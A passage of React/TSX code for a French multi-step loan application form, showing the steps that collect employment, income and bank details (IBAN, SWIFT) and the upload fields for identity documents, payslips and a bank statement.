                        className="inline-flex items-center gap-1.5 rounded-xl border border-slate-200 px-4 py-2.5 text-xs font-bold text-slate-600 hover:bg-slate-50 cursor-pointer"
                      >
                        <ArrowLeft className="h-4 w-4" />
                        Précédent
                      </button>
                      
                      <button
                        type="button"
                        onClick={handleNext}
                        className="inline-flex items-center gap-2 rounded-xl bg-slate-900 px-5 py-3 text-sm font-semibold text-white hover:bg-slate-800 cursor-pointer"
                      >
                        Étape suivante
                        <ArrowRight className="h-4 w-4" />
                      </button>
                    </div>
                  </motion.div>
                )}

                {/* STEP 3: PROFESSIONAL & FINANCIAL DETAILS */}
                {step === 3 && (
                  <motion.div
                    key="step-3"
                    initial={{ opacity: 0, x: 20 }}
                    animate={{ opacity: 1, x: 0 }}
                    exit={{ opacity: 0, x: -20 }}
                    className="space-y-6"
                  >
                    <header className="border-b border-slate-100 pb-4">
                      <h3 className="text-lg font-bold text-slate-900">Bloc 3 : Activité professionnelle & Banque de remboursement</h3>
                      <p className="text-xs text-slate-500 mt-1">Fournissez les renseignements sur vos revenus garantissant l'amortissement du prêt.</p>
                    </header>

                    <h4 className="text-xs font-bold text-slate-500 uppercase tracking-widest border-l-2 border-emerald-500 pl-2">Informations Professionnelles</h4>

                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-5">
                      {/* Profession */}
                      <div>
                        <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">Intitulé du poste / Profession *</label>
                        <input
                          type="text"
                          name="profession"
                          id="prof-profession"
                          value={formData.profession}
                          onChange={handleTextChange}
                          className={`w-full rounded-lg border px-3.5 py-2 text-sm focus:outline-none focus:ring-2 ${
                            validationErrors.profession ? 'border-rose-400 focus:ring-rose-200' : 'border-slate-200 focus:ring-emerald-200'
                          }`}
                        />
                        {validationErrors.profession && (
                          <p className="text-[11px] text-rose-500 mt-1 flex items-center gap-1 font-medium">
                            <AlertCircle className="h-3 w-3" />
                            {validationErrors.profession}
                          </p>
                        )}
                      </div>

                      {/* Employeur */}
                      <div>
                        <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">Nom de l’employeur / Entreprise *</label>
                        <input
                          type="text"
                          name="employeur"
                          id="prof-employeur"
                          value={formData.employeur}
                          onChange={handleTextChange}
                          className={`w-full rounded-lg border px-3.5 py-2 text-sm focus:outline-none focus:ring-2 ${
                            validationErrors.employeur ? 'border-rose-400 focus:ring-rose-200' : 'border-slate-200 focus:ring-emerald-200'
                          }`}
                        />
                        {validationErrors.employeur && (
                          <p className="text-[11px] text-rose-500 mt-1 flex items-center gap-1 font-medium">
                            <AlertCircle className="h-3 w-3" />
                            {validationErrors.employeur}
                          </p>
                        )}
                      </div>

                      {/* Type de contrat */}
                      <div>
                        <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">Type de contrat de travail *</label>
                        <select
                          name="typeContrat"
                          value={formData.typeContrat}
                          onChange={handleTextChange}
                          className="w-full rounded-lg border border-slate-200 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-emerald-200"
                        >
                          <option value="CDI">CDI (Contrat à durée indéterminée)</option>
                          <option value="CDD">CDD (Contrat à durée déterminée)</option>
                          <option value="Freelance">Freelance / Indépendant</option>
                          <option value="Fonctionnaire">Fonctionnaire / Service public</option>
                          <option value="Autres">Autres types (Chômage, Retraite)</option>
                        </select>
                      </div>

                      {/* Anciennete */}
                      <div>
                        <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">Ancienneté chez l'employeur</label>
                        <input
                          type="text"
                          name="anciennete"
                          id="prof-anciennete"
                          value={formData.anciennete}
                          onChange={handleTextChange}
                          className={`w-full rounded-lg border px-3.5 py-2 text-sm focus:outline-none focus:ring-2 ${
                            validationErrors.anciennete ? 'border-rose-400 focus:ring-rose-200' : 'border-slate-200 focus:ring-emerald-200'
                          }`}
                        />
                        {validationErrors.anciennete && (
                          <p className="text-[11px] text-rose-500 mt-1 flex items-center gap-1 font-medium">
                            <AlertCircle className="h-3 w-3" />
                            {validationErrors.anciennete}
                          </p>
                        )}
                      </div>

                      {/* Revenus mensuels */}
                      <div>
                        <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">Revenus nets mensuels principaux *</label>
                        <div className="relative">
                          <input
                            type="number"
                            name="revenusMensuels"
                            value={formData.revenusMensuels}
                            onChange={handleTextChange}
                            className="w-full rounded-lg border border-slate-200 pl-3.5 pr-12 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-emerald-200"
                          />
                          <span className="absolute right-3 top-2 text-sm font-bold text-slate-400 font-mono">
                            {getDeviseSymbol(formData.devise)}
                          </span>
                        </div>
                      </div>


                      {/* Date de perception de salaire */}
                      <div className="sm:col-span-2">
                        <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">Date récurrente de perception de salaire (Jour du mois) *</label>
                        <input
                          type="text"
                          name="datePerceptionSalaire"
                          id="prof-datePerception"
                          value={formData.datePerceptionSalaire}
                          onChange={handleTextChange}
                          className={`w-full rounded-lg border px-3.5 py-2 text-sm focus:outline-none focus:ring-2 ${
                            validationErrors.datePerceptionSalaire ? 'border-rose-400 focus:ring-rose-200' : 'border-slate-200 focus:ring-emerald-200'
                          }`}
                        />
                        {validationErrors.datePerceptionSalaire && (
                          <p className="text-[11px] text-rose-500 mt-1 flex items-center gap-1 font-medium">
                            <AlertCircle className="h-3 w-3" />
                            {validationErrors.datePerceptionSalaire}
                          </p>
                        )}
                      </div>
                    </div>

                    <h4 className="text-xs font-bold text-slate-500 uppercase tracking-widest border-l-2 border-emerald-500 pl-2 pt-3">Coordonnées de remboursement (Banque principale)</h4>

                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-5">
                      {/* Banque princ */}
                      <div>
                        <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">Nom de l'établissement bancaire *</label>
                        <input
                          type="text"
                          name="banquePrincipale"
                          id="financial-banque"
                          value={formData.banquePrincipale}
                          onChange={handleTextChange}
                          className={`w-full rounded-lg border px-3.5 py-2 text-sm focus:outline-none focus:ring-2 ${
                            validationErrors.banquePrincipale ? 'border-rose-400 focus:ring-rose-200' : 'border-slate-200 focus:ring-emerald-200'
                          }`}
                        />
                        {validationErrors.banquePrincipale && (
                          <p className="text-[11px] text-rose-500 mt-1 flex items-center gap-1 font-medium">
                            <AlertCircle className="h-3 w-3" />
                            {validationErrors.banquePrincipale}
                          </p>
                        )}
                      </div>

                      {/* Titulaire compte */}
                      <div>
                        <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">Nom exact du titulaire du compte *</label>
                        <input
                          type="text"
                          name="nomTitulaireCompte"
                          id="financial-titulaire"
                          value={formData.nomTitulaireCompte}
                          onChange={handleTextChange}
                          className={`w-full rounded-lg border px-3.5 py-2 text-sm focus:outline-none focus:ring-2 ${
                            validationErrors.nomTitulaireCompte ? 'border-rose-400 focus:ring-rose-200' : 'border-slate-200 focus:ring-emerald-200'
                          }`}
                        />
                        {validationErrors.nomTitulaireCompte && (
                          <p className="text-[11px] text-rose-500 mt-1 flex items-center gap-1 font-medium">
                            <AlertCircle className="h-3 w-3" />
                            {validationErrors.nomTitulaireCompte}
                          </p>
                        )}
                      </div>

                      {/* IBAN ou numéro de compte */}
                      <div className="sm:col-span-2">
                        <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">IBAN ou numéro de compte bancaire réglementaire *</label>
                        <input
                          type="text"
                          name="iban"
                          id="financial-iban"
                          value={formData.iban}
                          onChange={handleTextChange}
                          className={`w-full rounded-lg border px-3.5 py-2 text-sm focus:outline-none focus:ring-2 ${
                            validationErrors.iban ? 'border-rose-400 focus:ring-rose-200' : 'border-slate-200 focus:ring-emerald-200'
                          }`}
                        />
                        {validationErrors.iban && (
                          <p className="text-[11px] text-rose-500 mt-1 flex items-center gap-1 font-medium">
                            <AlertCircle className="h-3 w-3" />
                            {validationErrors.iban}
                          </p>
                        )}
                      </div>

                      {/* Code SWIFT BIC */}
                      <div>
                        <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5 font-semibold">Code SWIFT / BIC *</label>
                        <input
                          type="text"
                          name="swiftBic"
                          value={formData.swiftBic}
                          onChange={handleTextChange}
                          className={`w-full rounded-lg border px-3.5 py-2 text-sm focus:outline-none focus:ring-2 ${
                            validationErrors.swiftBic ? 'border-rose-400 focus:ring-rose-200' : 'border-slate-200 focus:ring-emerald-200'
                          }`}
                        />
                        {validationErrors.swiftBic && (
                          <p className="text-[11px] text-rose-500 mt-1 flex items-center gap-1 font-medium">
                            <AlertCircle className="h-3 w-3" />
                            {validationErrors.swiftBic}
                          </p>
                        )}
                      </div>

                      {/* Type de compte */}
                      <div>
                        <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">Type de compte bancaire *</label>
                        <select
                          name="typeCompte"
                          value={formData.typeCompte}
                          onChange={handleTextChange}
                          className="w-full rounded-lg border border-slate-200 px-3.5 py-2 text-sm bg-white focus:outline-none focus:ring-emerald-200 focus:border-emerald-600"
                        >
                          <option value="Courant">Courant</option>
                          <option value="Épargne">Épargne</option>
                          <option value="Professionnel">Professionnel</option>
                          <option value="Autre">Autre</option>
                        </select>
                      </div>

                    </div>

                    <div className="pt-4 border-t border-slate-100 flex justify-between">
                      <button
                        type="button"
                        onClick={handleBack}
                        className="inline-flex items-center gap-1.5 rounded-xl border border-slate-200 px-4 py-2.5 text-xs font-bold text-slate-600 hover:bg-slate-50 cursor-pointer"
                      >
                        <ArrowLeft className="h-4 w-4" />
                        Précédent
                      </button>
                      
                      <button
                        type="button"
                        onClick={handleNext}
                        className="inline-flex items-center gap-2 rounded-xl bg-slate-900 px-5 py-3 text-sm font-semibold text-white hover:bg-slate-800 cursor-pointer"
                      >
                        Étape suivante
                        <ArrowRight className="h-4 w-4" />
                      </button>
                    </div>
                  </motion.div>
                )}

                {/* STEP 4: UPLOADING SUPPORTING DOCUMENTS */}
                {step === 4 && (
                  <motion.div
                    key="step-4"
                    initial={{ opacity: 0, x: 20 }}
                    animate={{ opacity: 1, x: 0 }}
                    exit={{ opacity: 0, x: -20 }}
                    className="space-y-6"
                  >
                    <header className="border-b border-slate-100 pb-4">
                      <h3 className="text-lg font-bold text-slate-900">Bloc 4 : Téléchargement de vos documents justificatifs officiels</h3>
                      <p className="text-xs text-slate-500 mt-1">
                        Pour valider réglementairement votre crédit, vous devez transférer un scan lisible ou une photographie de ces 4 pièces. Glissez-déposez vos fichiers.
                      </p>
                    </header>

                    {/* Check constraints warning */}
                    <div className="rounded-xl bg-slate-950 p-4 border border-slate-800 text-slate-400 text-xs">
                      <span className="text-emerald-400 font-bold block mb-1">CONFORMITÉ RGPD :</span> Allégations de sécurité. Tous les documents transférés sont cryptés à la source de votre navigateur à l’aide du protocole sécurisé HTTPS.
                    </div>

                    <div className="space-y-5">
                      
                      {/* 1. Pièce d'identité (CNI ou Passeport) regroupée */}
                      <div 
                        className={`border rounded-2xl p-5 transition-colors ${
                          (validationErrors.pieceIdentite || validationErrors.pieceIdentiteVerso)
                            ? 'bg-rose-50/25 border-rose-300' 
                            : (documents.pieceIdentite && documents.pieceIdentiteVerso)
                              ? 'bg-emerald-50/10 border-emerald-300'
                              : 'bg-white border-slate-200'
                        }`}
                      >
                        <label className="block text-xs font-bold text-slate-900 mb-1 leading-tight uppercase tracking-wider">
                          1. Pièce d'identité (CNI ou Passeport) *
                        </label>
                        <p className="text-[10px] text-slate-500 mb-4">Format PDF, JPG ou PNG - Max 5 Mo par fichier</p>

                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                          {/* Face Avant / Recto */}
                          <div className="space-y-1.5">
                            <span className="block text-[11px] font-bold text-slate-700">Scan RECTO (Face avant) *</span>
                            <AnimatePresence mode="wait">
                              {documents.pieceIdentite ? (
                                <motion.div
                                  initial={{ opacity: 0, scale: 0.98 }}
                                  animate={{ opacity: 1, scale: 1 }}
                                  exit={{ opacity: 0 }}
                                  className="flex items-center justify-between rounded-xl border border-slate-200 bg-white p-3 shadow-inner"
                                >
                                  <div className="flex items-center gap-2.5 min-w-0">
                                    <div className="h-8 w-8 rounded-lg bg-emerald-50 text-emerald-600 flex items-center justify-center shrink-0">
                                      <FileText className="h-4 w-4" />
                                    </div>
                                    <div className="min-w-0">
                                      <span className="block text-xs font-semibold text-slate-900 truncate">
                                        {documents.pieceIdentite.name}
                                      </span>
                                      <span className="block text-[10px] text-slate-400 font-mono mt-0.5">
                                        ({(documents.pieceIdentite.size / 1024 / 1024).toFixed(2)} Mo)
                                      </span>
                                    </div>
                                  </div>
                                  <button
                                    type="button"
                                    onClick={() => removeFile('pieceIdentite')}
                                    className="h-8 w-8 rounded-lg flex items-center justify-center text-rose-500 hover:bg-rose-50 hover:text-rose-700 transition-colors"
                                    title="Supprimer la face avant"
                                  >
                                    <Trash2 className="h-4.5 w-4.5" />
                                  </button>
                                </motion.div>
                              ) : (
                                <div
                                  onDragOver={handleDragOver}
                                  onDrop={(e) => handleDrop(e, 'pieceIdentite')}
                                  className="border-2 border-dashed border-slate-200 hover:border-emerald-500 hover:bg-slate-50/50 rounded-xl p-3 text-center cursor-pointer relative transition-all group"
                                >
                                  <input
                                    type="file"
                                    id="file-input-pieceIdentite"
                                    onChange={(e) => handleFileChange(e, 'pieceIdentite')}
                                    className="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
                                    accept=".pdf,.jpg,.jpeg,.png"
                                  />
                                  <UploadCloud className="h-6 w-6 text-slate-400 group-hover:text-emerald-500 mx-auto mb-1.5 transition-colors" />
                                  <span className="block text-[11px] text-slate-600 font-semibold group-hover:text-emerald-600">
                                    Déposez le recto, ou <span className="text-emerald-600 underline font-medium">parcourez</span>
                                  </span>
                                </div>
                              )}
                            </AnimatePresence>
                            {validationErrors.pieceIdentite && (
                              <p className="text-[11px] text-rose-500 font-medium flex items-center gap-1 mt-1">
                                <AlertCircle className="h-3 w-3" />
                                {validationErrors.pieceIdentite}
                              </p>
                            )}
                          </div>

                          {/* Face Arrière / Verso */}
                          <div className="space-y-1.5">
                            <span className="block text-[11px] font-bold text-slate-700">Scan VERSO (Face arrière) *</span>
                            <AnimatePresence mode="wait">
                              {documents.pieceIdentiteVerso ? (
                                <motion.div
                                  initial={{ opacity: 0, scale: 0.98 }}
                                  animate={{ opacity: 1, scale: 1 }}
                                  exit={{ opacity: 0 }}
                                  className="flex items-center justify-between rounded-xl border border-slate-200 bg-white p-3 shadow-inner"
                                >
                                  <div className="flex items-center gap-2.5 min-w-0">
                                    <div className="h-8 w-8 rounded-lg bg-emerald-50 text-emerald-600 flex items-center justify-center shrink-0">
                                      <FileText className="h-4 w-4" />
                                    </div>
                                    <div className="min-w-0">
                                      <span className="block text-xs font-semibold text-slate-900 truncate">
                                        {documents.pieceIdentiteVerso.name}
                                      </span>
                                      <span className="block text-[10px] text-slate-400 font-mono mt-0.5">
                                        ({(documents.pieceIdentiteVerso.size / 1024 / 1024).toFixed(2)} Mo)
                                      </span>
                                    </div>
                                  </div>
                                  <button
                                    type="button"
                                    onClick={() => removeFile('pieceIdentiteVerso')}
                                    className="h-8 w-8 rounded-lg flex items-center justify-center text-rose-500 hover:bg-rose-50 hover:text-rose-700 transition-colors"
                                    title="Supprimer la face arrière"
                                  >
                                    <Trash2 className="h-4.5 w-4.5" />
                                  </button>
                                </motion.div>
                              ) : (
                                <div
                                  onDragOver={handleDragOver}
                                  onDrop={(e) => handleDrop(e, 'pieceIdentiteVerso')}
                                  className="border-2 border-dashed border-slate-200 hover:border-emerald-500 hover:bg-slate-50/50 rounded-xl p-3 text-center cursor-pointer relative transition-all group"
                                >
                                  <input
                                    type="file"
                                    id="file-input-pieceIdentiteVerso"
                                    onChange={(e) => handleFileChange(e, 'pieceIdentiteVerso')}
                                    className="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
                                    accept=".pdf,.jpg,.jpeg,.png"
                                  />
                                  <UploadCloud className="h-6 w-6 text-slate-400 group-hover:text-emerald-500 mx-auto mb-1.5 transition-colors" />
                                  <span className="block text-[11px] text-slate-600 font-semibold group-hover:text-emerald-600">
                                    Déposez le verso, ou <span className="text-emerald-600 underline font-medium">parcourez</span>
                                  </span>
                                </div>
                              )}
                            </AnimatePresence>
                            {validationErrors.pieceIdentiteVerso && (
                              <p className="text-[11px] text-rose-500 font-medium flex items-center gap-1 mt-1">
                                <AlertCircle className="h-3 w-3" />
                                {validationErrors.pieceIdentiteVerso}
                              </p>
                            )}
                          </div>
                        </div>
                      </div>

                      {/* Bulletins de Salaire et Relevé Bancaire */}
                      {[
                        { key: 'bulletinsSalaire', label: '2. Bulletin de salaire (La dernière fiche de paie) *', desc: 'Format PDF ou JPG/PNG - Max 5 Mo' },
                        { key: 'releveBancaire', label: '3. Relevé d\'identité bancaire (RIB) ou relevé de compte *', desc: 'Format PDF - Max 5 Mo' }
                      ].map((item) => {
                        const fileKey = item.key as keyof typeof documents;
                        const uploadedFile = documents[fileKey];
                        const hasError = validationErrors[fileKey];
                        
                        return (
                          <div
                            key={item.key}
                            className={`border rounded-2xl p-4 transition-colors ${
                              hasError 
                                ? 'bg-rose-50/40 border-rose-300' 
                                : uploadedFile 
                                  ? 'bg-emerald-50/20 border-emerald-300' 
                                  : 'bg-white border-slate-200'
                            }`}
                          >
                            <label className="block text-xs font-bold text-slate-900 mb-1 leading-tight uppercase tracking-wider">
                              {item.label}
                            </label>
                            <p className="text-[10px] text-slate-500 mb-3">{item.desc}</p>
                            
                            <AnimatePresence mode="wait">
                              {uploadedFile ? (
                                <motion.div
                                  initial={{ opacity: 0, scale: 0.98 }}
                                  animate={{ opacity: 1, scale: 1 }}
                                  exit={{ opacity: 0 }}
                                  className="flex items-center justify-between rounded-xl border border-slate-200 bg-white p-3 shadow-inner"
                                >
                                  <div className="flex items-center gap-3 min-w-0">
                                    <div className="h-8 w-8 rounded-lg bg-emerald-50 text-emerald-600 flex items-center justify-center shrink-0">
                                      <FileText className="h-4.5 w-4.5" />
                                    </div>
                                    <div className="min-w-0">
                                      <span className="block text-xs font-semibold text-slate-900 truncate">
                                        {uploadedFile.name}
                                      </span>
                                      <span className="block text-[10px] text-slate-400 font-mono mt-0.5">
                                        ({(uploadedFile.size / 1024 / 1024).toFixed(2)} Mo)
                                      </span>
                                    </div>
                                  </div>
                                  
                                  <div className="flex items-center gap-1.5">
                                    <button
                                      type="button"
                                      onClick={() => removeFile(fileKey)}
                                      className="h-8 w-8 rounded-lg flex items-center justify-center text-rose-500 hover:bg-rose-50 hover:text-rose-700 transition-colors"
                                      title="Supprimer ce justificatif"
                                    >
                                      <Trash2 className="h-4.5 w-4.5" />
                                    </button>
                                  </div>
                                </motion.div>
                              ) : (
                                <div
                                  onDragOver={handleDragOver}
                                  onDrop={(e) => handleDrop(e, fileKey)}
                                  className="border-2 border-dashed border-slate-200 hover:border-emerald-500 hover:bg-slate-50/50 rounded-xl p-4 text-center cursor-pointer relative transition-all group"
                                >
                                  <input
                                    type="file"
                                    id={`file-input-${item.key}`}
                                    onChange={(e) => handleFileChange(e, fileKey)}
                                    className="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
                                    accept=".pdf,.jpg,.jpeg,.png,.zip"
                                  />
                                  <UploadCloud className="h-7 w-7 text-slate-400 group-hover:text-emerald-500 mx-auto mb-2 transition-colors" />
                                  <span className="block text-xs text-slate-700 font-semibold group-hover:text-emerald-600">
                                    Glissez-déposez votre fichier ici, ou <span className="text-emerald-600 underline font-medium">parcourez votre ordinateur</span>
                                  </span>
                                </div>
                              )}
                            </AnimatePresence>
                            
                            {hasError && (
                              <p className="text-[11px] text-rose-500 mt-2 font-medium flex items-center gap-1">
                                <AlertCircle className="h-3 w-3" />
                                {hasError}
                              </p>
                            )}
                          </div>
                        );
                      })}

                    </div>

                    <div className="pt-4 border-t border-slate-100 flex justify-between items-center bg-white">
                      <button
                        type="button"
                        onClick={handleBack}
                        disabled={submitting}
                        className="inline-flex items-center gap-1.5 rounded-xl border border-slate-200 px-4 py-2.5 text-xs font-bold text-slate-600 hover:bg-slate-50 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                      >
                        <ArrowLeft className="h-4 w-4" />
                        Précédent
                      </button>
                      
                      <button
                        type="button"
                        onClick={handleFormSubmit}
                        disabled={submitting}
                        className="inline-flex items-center justify-center gap-2 rounded-xl bg-emerald-600 px-6 py-3.5 text-sm font-semibold text-white shadow-md hover:bg-emerald-500 transition-colors cursor-pointer disabled:opacity-75 disabled:cursor-not-allowed"
                      >
                        {submitting ? (
                          <>
                            <div className="h-4 w-4 animate-spin rounded-full border-2 border-white border-t-transparent" />
                            Transmission sécurisée...
                          </>
                        ) : (
                          <>
                            Soumettre ma demande de prêt
                            <CheckCircle2 className="h-4.5 w-4.5" />
                          </>
                        )}
                      </button>
                    </div>
                  </motion.div>
                )}

              </form>
            )}
          </AnimatePresence>

        </div>

      </div>
    </div>
  );
}
